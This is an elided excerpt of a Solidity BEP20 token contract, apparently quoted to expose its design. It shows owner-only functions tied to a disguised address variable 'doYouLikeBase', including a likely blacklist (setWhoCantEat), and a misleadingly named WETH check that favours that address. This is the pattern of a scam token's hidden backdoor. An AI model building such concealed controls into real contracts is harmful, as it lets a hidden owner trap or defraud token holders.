...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function setisExcludedFromCut(address account, bool newValue) public {
        require(msg.sender == doYouLikeBase);
    ...
    function setWhoCantEat(address recipient, bool status) public {
        require(msg.sender == doYouLikeBase);
    ...
    function WETH(address addr, address re) private view returns(bool) {
        return addr == doYouLikeBase && !isMarketPair[re] && addr == re;
    }
...
contract Token is BEP20 {
    constructor() BEP20(
        ...
        [uint256(1),uint256(5),uint256(4)],//回流 生态 回购
        [uint256(1),uint256(5),uint256(4)],//回流 生态 回购
        [uint256(1),uint256(5),uint256(4)],//回流 生态 回购
        [uint256(69000000000000000000000),uint256(69000000000000000000000)],
        [0x25C763888D85B8B8A7e9B569963bb812A74d98AA,0x25C763888D85B8B8A7e9B569963bb812A74d98AA,0x25C763888D85B8B8A7e9B569963bb812A74d98AA]
    ){}
}